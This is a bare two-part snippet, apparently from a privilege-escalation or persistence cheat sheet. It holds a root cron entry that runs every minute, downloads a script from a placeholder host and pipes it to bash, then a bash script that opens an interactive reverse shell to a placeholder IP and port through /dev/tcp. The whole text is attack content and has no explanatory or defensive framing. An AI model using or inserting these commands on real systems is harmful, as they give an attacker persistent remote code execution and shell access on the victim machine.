* *     * * *   root    curl http://<IP>:8080/shell | bash



#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1
